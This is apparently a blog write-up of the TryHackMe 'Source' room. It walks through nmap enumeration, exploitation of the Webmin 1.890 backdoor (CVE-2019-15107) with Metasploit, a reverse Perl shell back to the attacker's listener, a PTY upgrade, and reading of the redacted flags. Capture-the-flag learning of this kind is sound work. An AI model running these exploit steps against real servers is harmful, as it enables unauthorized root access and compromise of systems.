---
layout: post
title: "THM Source Writeup"
date: 2026-03-05
categories: [TryHackMe]
tags: [thm, writeup]
---

Methodology for the Source TryHackMe room.  here: https://tryhackme.com/room/source

## Enumeration

Nmap:
``` bash
┌──(kali㉿kali)-[~/Documents/thm]
└─$ nmap -sV -sC -T4 -p- 10.x.x.x                                           
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-06
...
Nmap scan report for 10.x.x.x
Host is up (0.015s latency).
Not shown: 65533 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b7:4c:d0:bd:e2:7b:1b:15:72:27:64:56:29:15:ea:23 (RSA)
|   256 b7:85:23:11:4f:44:fa:22:00:8e:40:77:5e:cf:28:7c (ECDSA)
|_  256 a9:fe:4b:82:bf:89:34:59:36:5b:ec:da:c2:d3:95:ce (ED25519)
10000/tcp open  http    MiniServ 1.890 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Findings:
 * Port 22 is running ssh, pretty normal
 * Port 10000 is not normally open, lets look into this:
      * its running MiniServ 1.890 (Webmin httpd), let's check if this has any exploits

## Looking for exploits

For ease of use, i'm just going to use metasploit and utilize the search command to try and find something:

```bash
msf > search Webmin 1.890

Matching Modules
================

   #  Name                                     Disclosure Date  Rank       Check  Description
   -  ----                                     ---------------  ----       -----  -----------
   0  exploit/linux/http/webmin_backdoor       2019-08-10       excellent  Yes    Webmin password_change.cgi Backdoor
   1    \_ target: Automatic (Unix In-Memory)  .                .          .      .
   2    \_ target: Automatic (Linux Dropper)   .                .          .      .


Interact with a module by name or index. For example info 2, use 2 or use exploit/linux/http/webmin_backdoor
After interacting with a module you can manually set a TARGET with set TARGET 'Automatic (Linux Dropper)'
```

Perfect, we found something to try in metasploit.

## Exploitation

```bash
msf > use 0
[*] Using configured payload cmd/unix/reverse_perl
msf exploit(linux/http/webmin_backdoor) > 
```

Now we set the correct options:

```bash
msf exploit(linux/http/webmin_backdoor) > show options

Module options (exploit/linux/http/webmin_backdoor):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported
                                          proxies: sapni, socks4, socks5, socks5h, http
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasplo
                                         it/basics/using-metasploit.html
   RPORT      10000            yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       Base path to Webmin
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address
                                        on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic (Unix In-Memory)



View the full module info with the info, or info -d command.

msf exploit(linux/http/webmin_backdoor) > 

```

After setting the correct options, we run the module.

```bash
msf exploit(linux/http/webmin_backdoor) > set RHOSTS 10.x.x.x.x
RHOSTS => 10.x.x.x.x                                                                                                              
msf exploit(linux/http/webmin_backdoor) > set LHOST 192.x.x.x.x                                                                 
LHOST => 192.x.x.x.x                                                                                                            
msf exploit(linux/http/webmin_backdoor) > exploit
[*] Started reverse TCP handler on 192.x.x.x.x:4444                                                                             
[*] Running automatic check ("set AutoCheck false" to disable)                                                                      
[-] Please enable the SSL option to proceed                                                                                         
[-] Exploit aborted due to failure: unknown: Cannot reliably check exploitability. "set ForceExploit true" to override check result.
[*] Exploit completed, but no session was created.
msf exploit(linux/http/webmin_backdoor) > set SSL true
[!] Changing the SSL option's value may require changing RPORT!
SSL => true
msf exploit(linux/http/webmin_backdoor) > run
[*] Started reverse TCP handler on 192.x.x.x.x:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Configuring Automatic (Unix In-Memory) target
[*] Sending cmd/unix/reverse_perl command payload
[*] Command shell session 1 opened (192.x.x.x.x:4444 -> 10.x.x.x.x:43670) at 2026-03-05 23:53:33 -0500

whoami
root

```

We had to set SSL to true because Webmin 1.890 runs over HTTPS by default, so metasploit needs SSL enabled to communicate with it or it can't reach the backdoor url. (http://10.x.x.x:10000/**password_change.cgi**)

Surprisingly easy, metasploit is very powerful when it works!

## Finding Flags

As root, this is trivial, but first let's secure our shell:
```bash
pwd
/usr/share/webmin
python -c 'import pty;pty.spawn("/bin/bash")'
root@source:/usr/share/webmin/# whoami
whoami
root
root@source:/usr/share/webmin/# 
```

Before exploring the system, we upgrade our raw (unstable) shell to a fully interactive TTY (more stable). The default reverse shell from Metasploit is non-interactive, so commands like su will hang and there's no tab completion or command history. Spawning a PTY with Python fixes this:
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```
On boxes where Python isn't available, common fallbacks are script /dev/null -c bash or python3 instead of python. You can just google this too.

Now we find the flags!

``` bash
root@source:/usr/share/webmin# cd /
cd /
root@source:/# find . -name user.txt
find . -name user.txt
./home/dark/user.txt
root@source:/# cat ./home/dark/user.txt
cat ./home/dark/user.txt
THM{XXXXXX_XXXXX_XXXXXXXXXX}
root@source:/# find . -name root.txt
find . -name root.txt
./root/root.txt
root@source:/# cat ./root/root.txt
cat ./root/root.txt
THM{XXXXXX_XXXX_XXXXXXX}
root@source:/# :)
```

And done! (you have to find the flags for yourself)

## Notes

- This was actually CVE-2019-15107 - more here: https://nvd.nist.gov/vuln/detail/cve-2019-15107

Thank you for reading!
